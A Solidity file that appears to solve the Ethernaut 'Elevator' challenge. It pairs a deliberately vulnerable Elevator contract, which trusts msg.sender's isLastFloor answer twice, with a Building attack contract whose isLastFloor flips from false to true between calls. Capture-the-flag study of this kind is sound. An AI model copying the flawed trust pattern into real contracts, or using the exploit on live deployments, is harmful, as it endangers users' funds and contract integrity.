// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

// interface Building {
//     function isLastFloor(uint) external returns (bool);
// }

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Building {
    Elevator public elevator;
    uint256 public control;

    constructor(address addr) public {
        elevator = Elevator(addr);
    }

    function attack() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        // first call
        if (control <= 0) {
            control++;
            return false;
        } else {
            return true;
        }
    }
}
